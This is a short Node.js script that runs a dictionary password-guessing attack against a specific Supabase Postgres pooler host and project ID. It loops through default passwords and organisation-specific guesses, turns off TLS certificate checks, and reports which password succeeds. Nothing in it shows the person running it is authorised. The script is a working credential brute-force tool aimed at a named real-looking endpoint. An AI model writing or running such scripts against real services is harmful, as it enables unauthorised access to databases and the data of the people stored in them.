const { Client } = require('pg');

const projectRef = 'dnymnrceocbsgirwzphj';
const host = 'aws-1-ap-northeast-2.pooler.supabase.com';
const port = 6543;

const passwords = [
  'postgres',
  'supabase',
  'admin',
  'password',
  'root',
  'mlrit123',
  'mlrit',
  'mentoring',
  'mentoring123',
  'mentoring-assistant'
];

async function tryPassword(password) {
  const connectionString = `postgresql://postgres.${projectRef}:${password}@${host}:${port}/postgres`;
  
  const client = new Client({
    connectionString,
    ssl: { rejectUnauthorized: false },
    connectionTimeoutMillis: 3000,
  });

  try {
    await client.connect();
    console.log(`\n🎉 SUCCESS! Password is: "${password}"`);
    await client.end();
    return true;
  } catch (err) {
    if (err.message.includes('authentication failed')) {
      console.log(`❌ Incorrect password: "${password}"`);
    } else {
      console.log(`Host: ${host} - Error with password "${password}": ${err.message}`);
    }
    try {
      await client.end();
    } catch (e) {}
    return false;
  }
}

async function main() {
  console.log(`Testing passwords against ${host}...`);
  for (const pwd of passwords) {
    const ok = await tryPassword(pwd);
    if (ok) {
      process.exit(0);
    }
  }
  console.log('\nFinished testing candidates. None succeeded.');
  process.exit(1);
}

main();
